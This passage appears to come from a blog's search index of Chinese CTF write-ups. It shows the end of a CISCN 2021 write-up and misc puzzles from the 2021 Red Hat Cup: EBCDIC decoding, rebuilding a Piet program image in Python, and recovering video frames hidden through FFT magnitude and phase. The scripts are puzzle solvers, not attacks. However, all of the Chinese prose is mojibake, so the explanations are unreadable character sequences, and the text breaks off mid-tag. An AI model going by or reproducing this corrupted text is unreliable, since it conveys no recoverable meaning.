easy_robo_xx</span></code></pre><p>è¿˜åŸå‡ºæ¥æœºå™¨äººç»˜åˆ¶çš„å­—ç¬¦ä¸²ä¸º <code>easy_robo_xx</code></p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/info.png"></p><p>md5  <code>d4f1fb80bc11ffd722861367747c0f10</code></p><p><code>CISCN{d4f1fb80bc11ffd722861367747c0f10}</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ„Ÿè°¢ 360 é¦–æ¬¡å°† CTF é¶åœºå˜æˆäº†è€ƒåœºã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/ciscn.png" alt="æ¯”èµ›ç¯å¢ƒ"></p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525215412840.png"></p><p>åˆèµ›å°±è¿™ä¹ˆè‚ä¹Ÿå¤ªé¡¶äº†ï¼Œæ‰“ä¸åŠ¨äº† Orz</p><p>åä¸œåŒ—èµ›åŒºä¹Ÿå¤ªå·äº†å§ï¼Œå–µå‘œå‘œå‘œã€‚</p><p>å”‰ï¼Œä¸è¿‡å’±æ²¡è¿›å¤èµ›ï¼Œå–µå‘œå‘œå‘œå‘œã€‚</p><p>å®³ï¼Œé—®é¢˜ä¸å¤§ï¼Œå¯èƒ½ä¹Ÿæ˜¯æœ€åä¸€æ¬¡å›½èµ›äº†å§ï¼Œéš¾å¾—å¤§å¸ˆå‚…ä»¬å¸¦å’±ç©ï¼Œä¹Ÿéå¸¸æ„Ÿè°¢é˜Ÿå‹ä¸€èµ·æ‰“ã€‚</p><p>ä¹‹åå¤§ä½¬ä»¬å¥½å¥½ç©ï¼Œå’±æºœäº†æºœäº†å–µã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 çº¢å¸½æ¯ WriteUp</title>
      <link href="2021/05/24/CTF_2021RedHat/"/>
      <url>2021/05/24/CTF_2021RedHat/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/24/CTF_2021RedHat/image-20210509221201690.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>ç¬¬å››å±Šâ€œçº¢å¸½æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›</strong></p><p>æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ9æ—¥10:00-18:00</p><p><a href="https://race.ichunqiu.com/2021redhat">https://race.ichunqiu.com/2021redhat</a></p></blockquote><p>å‰æ®µæ—¶é—´æ‰“äº†ä¸ªçº¢å¸½æ¯ï¼Œä¸è¿‡è¿™æ®µæ—¶é—´ä¸€ç›´åœ¨å¿™æ²¡ç©ºæ•´ç† Writeupã€‚</p><p>è¶ç€ä»Šå¤©æ‘¸é±¼ï¼Œå¤ç°äº†ä¸¤é“ Misc é¢˜ã€‚å…¶ä»–å°±ç®€å•è®°å½•ä¸€ä¸‹å§ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>EBCDIC ç¼–ç </p><p><img src="/2021/05/24/CTF_2021RedHat/upload_1d74aac0f0ef87a00013abb1375f1c44.png"></p><p><code>flag{we1c0me_t0_redhat2021}</code></p><h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><blockquote><p>colorful code is beautiful, isnâ€™t it?</p><p>æœ€ç»ˆå¾—åˆ°flagçš„æ ¼å¼ä¸­åŠ ä¸Šflag{}åŒ…è£¹å†æäº¤</p><p><a href="https://pan.baidu.com/s/1_mvdJ5G6qPTFOd0jfnPwFw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/phvaVooK">å¤‡ç”¨ä¸‹è½½</a></p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸¤ä¸ª <code>data{1,2}</code></p><p>data1 æ˜¯ä¸€ä¸² 0-19 ä¹‹é—´çš„æ•°å­—</p><p><img src="/2021/05/24/CTF_2021RedHat/image-20210509215634320.png" alt="data1"></p><p>data2 æ˜¯ä¸€å †å¥‡å¥‡æ€ªæ€ªä½†åˆæœ‰è§„å¾‹çš„å­—ç¬¦</p><p><img src="/2021/05/24/CTF_2021RedHat/image-20210509215902936.png" alt="data2"></p><p>è€Œ data2 è¿™æœ€å‰é¢çš„ä¸œè¥¿å¥½åƒé¢œè‰²çš„æ ‡è¯†å•Šã€‚å°±ç±»ä¼¼äº <code>#FF0000</code> è¿™æ ·ã€‚</p><p>äºæ˜¯å‘ç°å¯èƒ½æ˜¯ <strong>npiet</strong>ã€‚</p><p>å‚è€ƒ <a href="https://www.dangermouse.net/esoteric/piet.html">https://www.dangermouse.net/esoteric/piet.html</a></p><blockquote><p>Piet is a programming language in which programs look like abstract paintings. The language is named after <a href="http://www.ibiblio.org/wm/paint/auth/mondrian/">Piet Mondrian</a>, who pioneered the field of geometric abstract art. I would have liked to call the language Mondrian, but <a href="https://link.springer.com/chapter/10.1007/3-540-45337-7_9">someone beat me to it</a> with a rather mundane-looking scripting language. Oh well, we canâ€™t all be esoteric language writers I suppose.</p></blockquote><p>å‚è€ƒ <a href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p><blockquote><p><a href="https://www.bertnase.de/npiet/npiet-screen.png"><strong>npiet</strong></a> is an interpreter for piet programs and takes as input a <a href="http://www.pmview.com/help/pmview/pbmplus_portable_pixmap_ppm_.html">portable pixmap</a> (a ppm file) and since v0.3a <strong>png</strong> and <strong>gif</strong> files  too - other formats may follow.</p></blockquote><p>è¿™æ˜¯ä¸€ç§åŸºäºå›¾åƒé¢œè‰²çš„ç¼–ç¨‹è¯­è¨€ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–æœ‰æ„æ€è€Œç¥ç§˜çš„ç¼–ç¨‹è¯­è¨€ï¼Œè¯¦è§ <a href="https://en.wikipedia.org/wiki/Esoteric_programming_language">Esoteric programming language</a>ã€‚</p><p>ç»Ÿè®¡ä¸€ä¸‹ data1 æ€»å…±æœ‰ 7076 ä¸ªæ•°å­—ï¼Œ<a href="http://tools.jb51.net/jisuanqi/factor_calc">åˆ†è§£è´¨å› æ•°</a> å¾—åˆ°ä¸º 37*191ã€‚</p><p>è€ƒè™‘è¿™å°±æ˜¯å›¾åƒçš„å®½å’Œé«˜äº†ã€‚</p><p>æŒ‰ç…§åŸç‰ˆçš„æ˜ å°„ï¼Œé¢œè‰²åº”è¯¥å¯¹åº”æ˜¯ä¸‹å›¾è¿™æ ·çš„ã€‚</p><p><img src="/2021/05/24/CTF_2021RedHat/image-20210509220834285.png"></p><p>ç„¶è€Œè¿™é¢˜é‡Œé­”æ”¹äº†ä¸€ä¸‹ï¼Œå°±æ ¹æ® data2 é‡æ–°æ˜ å°„ä¸€ä¸‹ã€‚</p><p>å†™ä¸ª jioæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">37</span>y <span class="token operator">=</span> <span class="token number">191</span>c <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># åŸç‰ˆæ˜ å°„</span><span class="token comment"># colors = ["FFC0C0", "FFFFC0", "C0FFC0",</span><span class="token comment">#           "C0FFFF", "C0C0FF", "FFC0FF",</span><span class="token comment">#           "FF0000", "FFFF00", "00FF00",</span><span class="token comment">#           "00FFFF", "0000FF", "FF00FF",</span><span class="token comment">#           "C00000", "C0C000", "00C000",</span><span class="token comment">#           "00C0C0", "0000C0", "C000C0",</span><span class="token comment">#           "000000", "FFFFFF"]</span><span class="token comment"># æŒ‰ç…§ data2 å‰20ä¸ªåƒç´ æ¥æ˜ å°„</span>colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'0000C0'</span><span class="token punctuation">,</span> <span class="token string">'00FFFF'</span><span class="token punctuation">,</span> <span class="token string">'00FF00'</span><span class="token punctuation">,</span> <span class="token string">'FFC0FF'</span><span class="token punctuation">,</span> <span class="token string">'FFC0C0'</span><span class="token punctuation">,</span> <span class="token string">'C0C0FF'</span><span class="token punctuation">,</span> <span class="token string">'C0C000'</span><span class="token punctuation">,</span> <span class="token string">'FF00FF'</span><span class="token punctuation">,</span> <span class="token string">'FF0000'</span><span class="token punctuation">,</span>          <span class="token string">'C00000'</span><span class="token punctuation">,</span> <span class="token string">'C000C0'</span><span class="token punctuation">,</span> <span class="token string">'FFFFFF'</span><span class="token punctuation">,</span> <span class="token string">'FFFF00'</span><span class="token punctuation">,</span> <span class="token string">'FFFFC0'</span><span class="token punctuation">,</span> <span class="token string">'00C000'</span><span class="token punctuation">,</span> <span class="token string">'00C0C0'</span><span class="token punctuation">,</span> <span class="token string">'C0FFFF'</span><span class="token punctuation">,</span> <span class="token string">'C0FFC0'</span><span class="token punctuation">,</span> <span class="token string">'0000FF'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">hex2int</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        color <span class="token operator">=</span> colors<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        c<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span><span class="token punctuation">,</span> hex2int<span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">+=</span> <span class="token number">1</span>c<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"c.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°</p><p><img src="/2021/05/24/CTF_2021RedHat/c.png" alt="c"></p><p>å†åˆ° <strong><a href="https://www.bertnase.de/npiet/npiet-execute.php">npiet online</a></strong> ä¸Šå»æ‰§è¡Œä¸€ä¸‹ï¼Œå°±èƒ½æ‹¿åˆ° flag äº†ã€‚</p><p><img src="/2021/05/24/CTF_2021RedHat/image-20210509220347028.png"></p><p><code>flag{88842f20-fb8c-45c9-ae8f-36135b6a0f11}</code></p><h3 id="PicPic"><a href="#PicPic" class="headerlink" title="PicPic"></a>PicPic</h3><blockquote><p>ä½ æƒ³æˆä¸ºCVå¤§å¸ˆå˜›ï¼Ÿ</p><p><a href="https://pan.baidu.com/s/1GiXAmi2ZRVL4hBKTovfX9w">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/XyY8ELYw">å¤‡ç”¨ä¸‹è½½</a></p></blockquote><h4 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h4><p><code>create.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> cv2<span class="token keyword">import</span> struct<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">mapping</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_max <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    data_min <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data <span class="token operator">-</span> data_min<span class="token punctuation">)</span> <span class="token operator">*</span> new_interval <span class="token operator">/</span> interval <span class="token operator">+</span> down    new_data <span class="token operator">=</span> new_data<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>tp<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_data<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'frame'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i secret.mp4 frame/%03d.png'</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'frame'</span><span class="token punctuation">)</span>    r_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>        img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'frame/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>        m<span class="token punctuation">,</span> p <span class="token operator">=</span> fft<span class="token punctuation">(</span>img<span class="token punctuation">)</span>        r_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'!ff'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        new_img1 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>m<span class="token punctuation">)</span>        new_img2 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>p<span class="token punctuation">)</span>        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'm/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> new_img1<span class="token punctuation">)</span>        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> new_img2<span class="token punctuation">)</span>    r_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i m/%03d.png -r 25 -vcodec png 1.mkv'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i p/%03d.png -r 25 -vcodec png 2.mkv'</span><span class="token punctuation">)</span></code></pre><p>å¯ä»¥å‘ç°æŠŠè§†é¢‘åˆ‡åˆ†å¾—åˆ°æ¯ä¸€å¸§ï¼Œç„¶å FFT å¾—åˆ°å¹…åº¦må’Œç›¸ä½pï¼Œå†åˆå¹¶å¾—åˆ°ä¸¤ä¸ªè§†é¢‘ã€‚æ–‡ä»¶ <code>r</code> é‡Œå­˜äº†æ¯ä¸€å¸§ä¸­å¹…å€¼çš„æœ€å¤§å’Œæœ€å°å€¼ã€‚</p><p>é‚£å’±å°±åè¿‡æ¥ï¼Œé€šè¿‡å¹…å€¼å’Œç›¸ä½çš„è§†é¢‘åˆ‡åˆ†å¾—åˆ°æ¯ä¸€å¸§ï¼Œç„¶å IFFT å˜æ¢å›å»å°±å®Œäº‹äº†ã€‚</p><p>ç›¸ä½èŒƒå›´å°±æ˜¯ -pi åˆ° pi ä¹‹é—´ã€‚</p><p>å†™ä¸ªè„šæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> cv2<span class="token keyword">import</span> struct<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show<span class="token keyword">def</span> <span class="token function">unmapping</span><span class="token punctuation">(</span>data_min<span class="token punctuation">,</span> data_max<span class="token punctuation">,</span> data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token operator">-</span>down<span class="token punctuation">)</span> <span class="token operator">*</span> interval <span class="token operator">/</span> new_interval <span class="token operator">+</span> data_min    <span class="token comment"># new_data = (data - data_min) * new_interval / interval + down</span>    <span class="token comment"># new_data = new_data.astype(tp)</span>    <span class="token keyword">return</span> new_data<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    img <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>    img <span class="token operator">=</span> img<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>    <span class="token comment"># print(img)</span>    <span class="token keyword">return</span> img<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># os.mkdir('m')</span>    <span class="token comment"># os.mkdir('p')</span>    <span class="token comment"># os.mkdir('frame')</span>    <span class="token comment"># os.system('ffmpeg -i 1.mkv m/%03d.png')</span>    <span class="token comment"># os.system('ffmpeg -i 2.mkv p/%03d.png')</span>    r_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> r_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    r_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    m_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'!ff'</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># print(x)</span>        <span class="token comment"># min, max</span>        m_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> <span class="token builtin">file</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">:</span>        m_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'm/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>        p_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>        m_min<span class="token punctuation">,</span> m_max <span class="token operator">=</span> m_data<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>        m <span class="token operator">=</span> unmapping<span class="token punctuation">(</span>m_min<span class="token punctuation">,</span> m_max<span class="token punctuation">,</span> m_img<span class="token punctuation">)</span>        p <span class="token operator">=</span> unmapping<span class="token punctuation">(</span><span class="token operator">-</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> p_img<span class="token punctuation">)</span>        img_raw <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span>        <span class="token comment"># plot(img_raw)</span>        <span class="token comment"># show()</span>        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'frame/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> img_raw<span class="token punctuation">)</span></code></pre><p>åœ¨è¿˜åŸåçš„è§†é¢‘çš„æœ€åï¼Œå¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç  <code>zs6hmdlq5ohav5l1</code></p><p><img src="/2021/05/24/CTF_2021RedHat/200.png"></p><h4 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h4><p><code>hint.txt</code> æ˜¯ä¸ª MathML</p><pre class="language-none"><code class="language-none">&lt;math&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;mo&gt;âŸ¶&lt;/mo&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;â¡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;math&gt;</code></pre><p>ä¹Ÿå°±æ˜¯ </p><p><img src="/2021/05/24/CTF_2021RedHat/image-20210525002117213.png"></p><p>æ„æ€æ˜¯å¹…å€¼ä¸å˜ï¼Œè€Œç›¸ä½ç›¸äº’äº¤æ¢ã€‚</p><p>å¦å¤–ç»™äº†ä¸¤å¼ å›¾</p><p><img src="/2021/05/24/CTF_2021RedHat/mix1.png" 